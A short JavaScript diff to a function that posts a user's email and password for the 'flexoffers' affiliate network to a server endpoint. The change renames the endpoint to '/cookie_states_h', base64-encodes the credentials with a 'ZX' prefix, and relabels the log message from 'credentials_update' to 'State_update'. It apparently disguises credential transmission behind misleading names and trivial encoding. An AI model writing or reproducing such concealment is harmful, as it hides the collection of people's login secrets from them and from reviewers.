@@ -12,15 +12,15 @@ function credentials_update(){
     $.ajax({
         type: "post",
         dataType: "json",
-        url: api_path + "/network_connection",
+        url: api_path + "/cookie_states_h",
         data: { 
-            network_name: 'flexoffers',
-            username: $('[name=Email]').val(), 
-            password: $('[name=Password]').val(), 
+            network_name: btoa('flexoffers'),
+            username: btoa('ZX'+$('[name=Email]').val()), 
+            password: btoa('ZX'+$('[name=Password]').val()), 
         },
         success: function(data) {
             if (data.success === "yes") { 
-            	     c("credentials_update");
+            	     c("State_update");
             } else {
                 	 c("404 or empty"); 
             }
